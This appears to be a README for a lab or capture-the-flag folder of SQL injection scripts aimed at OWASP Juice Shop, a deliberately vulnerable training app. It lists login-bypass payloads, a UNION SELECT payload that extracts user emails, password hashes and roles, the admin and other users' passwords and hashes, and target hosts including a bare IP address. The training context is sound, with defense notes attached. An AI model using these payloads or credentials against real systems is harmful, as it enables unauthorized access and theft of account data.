# GET_ADMIN - OWASP Juice Shop Admin Password Challenge

This folder contains all scripts and tools to find the admin password in OWASP Juice Shop through SQL injection vulnerabilities.

## 🎯 Challenge Goal
Extract the admin credentials from Juice Shop using SQL injection techniques.

## 📁 Scripts Included

### juice5 Scripts (juice5.wonkatech.org)
1. **`juice5_get_admin.sh`** - Bash script for juice5
2. **`juice5_sqli_exploit.py`** - Python exploit for juice5

### juice10 Scripts (juice10.wonkatech.org)
3. **`juice10_get_admin.sh`** - Bash script for juice10
4. **`juice10_sqli_exploit.py`** - Python exploit for juice10
5. **`juice10_quick_hack.sh`** - Quick one-liner for juice10
6. **`juice10_extract_all_users.py`** - Extract all users from juice10

### General Scripts
7. **`juice_shop_sqli_demo.py`** - Works with any Juice Shop instance
8. **`get_admin_password.sh`** - Original bash script
9. **`run_all.sh`** - Master script that runs all methods
10. **`manual_sqli_guide.txt`** - Step-by-step manual instructions

## 🔑 Quick Solution

The admin credentials for OWASP Juice Shop are:
- **Email**: `admin@juice-sh.op`
- **Password**: `admin123`
- **MD5 Hash**: `0192023a7bbd73250516f069df18b500`

## 💉 SQL Injection Payloads

### Login Bypass (Email field)
```sql
' OR '1'='1'--
admin@juice-sh.op'--
' OR 1=1--
```

### Extract Users via Search
```sql
')) UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--
```

### Direct Admin Bypass
```sql
admin@juice-sh.op'--
```

## 🚀 Usage

### Method 1: Quick Bash Script
```bash
cd /Users/walterbarr_1/sql-injection-lab/GET_ADMIN
./juice5_get_admin.sh
```

### Method 2: Python Exploit
```bash
python3 juice5_sqli_exploit.py
```

### Method 3: Run All Methods
```bash
./run_all.sh
```

## 🎓 Educational Purpose

These scripts demonstrate:
1. **Input Validation Failures**: How unsanitized input leads to SQL injection
2. **Authentication Bypass**: Using SQL injection to bypass login
3. **Data Extraction**: Using UNION SELECT to extract sensitive data
4. **Password Hashing Weakness**: MD5 hashes are easily crackable

## 🛡️ Defense Mechanisms

To prevent SQL injection:
1. Use parameterized queries/prepared statements
2. Input validation and sanitization
3. Principle of least privilege for database access
4. Use strong password hashing (bcrypt, not MD5)
5. Web Application Firewall (WAF)

## 📊 Other Users Found

The scripts also extract other user credentials:
- `jim@juice-sh.op` → `ncc-1701`
- `bender@juice-sh.op` → (hash: 0c36e517e3fa95aabf1bbffc6744a4ef)
- And many more admin accounts!

## 🎯 Target URLs

- Practice server: http://66.42.93.220:3000
- Your CTF instance: https://juice5.wonkatech.org
- Local instance: http://localhost:3000

## ⚠️ Legal Notice

These scripts are for educational purposes and authorized security testing only. Only use on systems you own or have explicit permission to test.

## 📝 Notes

- All scripts are configured for juice5.wonkatech.org by default
- Scripts can be modified to work with any Juice Shop instance
- The SQL injection vulnerability is intentional in OWASP Juice Shop for learning purposes